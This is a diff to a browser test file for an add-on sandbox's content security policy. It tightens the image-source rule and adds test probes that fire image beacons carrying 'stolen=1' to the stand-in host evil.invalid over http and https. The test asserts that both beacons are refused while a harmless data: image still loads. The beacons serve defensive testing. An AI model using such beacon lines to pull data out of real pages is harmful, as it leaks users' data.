@@ -26,11 +26,12 @@ import { addOnFrame } from './support/addon';
  * *text*, which is exactly what an add-on is to the shell, so these run through the real
  * transport rather than a parallel one.
  *
- * **What this does not prove.** `img-src` is `https: data: blob:`, not the declared
- * `networkHosts`, so an `<img>` beacon to an arbitrary *https* host is still permitted —
- * `srcdoc.ts` says why, and closing it is a published-contract break rather than a
- * hardening detail. The assertion below is that the policy is enforced at all, which is the
- * thing that was missing, not that image exfiltration is impossible.
+ * **What the fourth refusal proves.** `img-src` was `https: data: blob:` until MICA-202,
+ * so an `<img>` beacon to an arbitrary *https* host was permitted and this file said so.
+ * It is now `data: blob:` plus the declared `networkHosts`, and the probe's https beacon
+ * is refused alongside the plaintext one. The `data:` image that loads beside them is the
+ * control: a policy that refused everything would pass every refusal assertion here while
+ * meaning no add-on could draw a picture at all.
  */
 
 /** A fixture add-on's manifest, as `defineApp` needs it. */
@@ -55,13 +56,30 @@ const PROBE_BUNDLE = `
   render();
 
   document.addEventListener('securitypolicyviolation', (e) => {
-    seen.add(e.effectiveDirective || e.violatedDirective);
+    const directive = e.effectiveDirective || e.violatedDirective;
+    seen.add(directive);
+    // The directive alone cannot tell the two image beacons apart, so record the origin
+    // the browser refused as well. blockedURI is stripped for reporting — to the origin
+    // for a cross-origin resource, which every resource is from an opaque-origin frame.
+    if (e.blockedURI) seen.add(directive + '=' + e.blockedURI);
     render();
   });
 
   // 1. A pixel beacon. Under an unset img-src this loads and takes the query string with it.
   const beacon = new Image();
   beacon.src = 'http://evil.invalid/beacon?stolen=1';
+
+  // 1b. The same beacon over https (MICA-202). Under img-src https: this one loaded —
+  //     the plaintext refusal above proved nothing about it — and networkHosts was never
+  //     consulted. The probe declares no hosts, so nothing but data: and blob: may draw.
+  const httpsBeacon = new Image();
+  httpsBeacon.src = 'https://evil.invalid/beacon?stolen=1';
+
+  // 1c. The control: a data: image, which cannot leave the frame and must still render.
+  const inline = new Image();
+  inline.addEventListener('load', () => { seen.add('data-image-loaded'); render(); });
+  inline.addEventListener('error', () => { seen.add('data-image-refused'); render(); });
+  inline.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
 
   // 2. A nested remote frame. CSP inherits only for local schemes, so before frame-src this
   //    child ran with no policy at all: unrestricted fetch, and a postMessage relay out
@@ -114,7 +132,9 @@ test.describe('the add-on sandbox', () => {
     await expect(page.locator('h1', { hasText: 'gPhone' })).toBeVisible();
   });
 
-  test('refuses an image beacon and a nested remote frame, and survives both', async ({ page }) => {
+  test('refuses an image beacon over http and https and a nested remote frame, and survives all three', async ({
+    page
+  }) => {
     await registerAddOn(page, 'sandbox_probe', 'Sandbox Probe', PROBE_BUNDLE);
     await page.getByRole('button', { name: 'Sandbox Probe' }).click();
 
@@ -123,7 +143,13 @@ test.describe('the add-on sandbox', () => {
     // happened to refuse everything under `default-src` would pass a substring check while
     // meaning something quite different from the directives that are written.
     await expect(violations).toContainText('img-src');
+    // The https beacon specifically (MICA-202): the plaintext one was refused before this
+    // ticket too, so `img-src` alone would pass under the old `https:` policy.
+    await expect(violations).toContainText('img-src=https://evil.invalid');
     await expect(violations).toContainText('frame-src');
+    // And a data: image still draws, so the refusal is a scoping and not a blackout.
+    await expect(violations).toContainText('data-image-loaded');
+    await expect(violations).not.toContainText('data-image-refused');
 
     /**
      * `form-action` is deliberately not asserted, and finding out why was worth the trip.
